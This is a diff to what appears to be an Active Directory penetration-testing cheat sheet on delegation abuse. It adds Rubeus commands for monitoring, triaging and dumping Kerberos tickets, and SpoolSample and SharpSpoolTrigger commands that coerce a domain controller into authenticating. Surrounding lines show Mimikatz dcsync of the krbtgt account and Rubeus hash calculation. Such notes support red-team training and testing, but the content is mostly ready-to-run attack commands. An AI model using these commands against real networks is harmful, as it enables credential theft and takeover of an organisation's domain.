@@ -675,17 +675,16 @@ ls \\<DC>\pipe\spoolss
 - Requires running as system!
 - https://powershell-guru.com/powershell-tip-53-run-powershell-as-system/
 ```
-.\rubeus.exe monitor /interval:5
+.\Rubeus.exe monitor /interval:5 /nowrap
 ```
 
 #### Force authentication of the DC
+- https://github.com/leechristensen/SpoolSample
+- https://github.com/cube0x0/SharpSystemTriggers
 ```
 .\SpoolSample.exe <DC FQDN> <TARGET SERVER WITH DELEGATION>
-```
 
-#### Copy, save and trim the ticket
-```
-cat dc_ticket.txt | tr -d "\n" | tr -d " "
+.\SharpSpoolTrigger.exe <DC FQDN> <TARGET SERVER WITH DELEGATION>
 ```
 
 #### Import the ticket
@@ -716,17 +715,12 @@ Get-Domaincomputer -TrustedToAuth
 Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 ```
 
-```
-.\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
-```
-
 ### Constrained delegation User
 #### Rubeus calculate password hash
 - If only password is available calculate the hash
 ```
 .\Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
 ```
-
 
 #### Check for user to impersonate
 ```
@@ -755,6 +749,12 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 ```
 
 ### Constrained delegation Computer
+#### Dump TGT of computeraccount
+```
+.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:<LUID> /service:<SERVICE> /nowrap
+```
+
 #### Rubeus request and inject TGT + TGS
 - Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
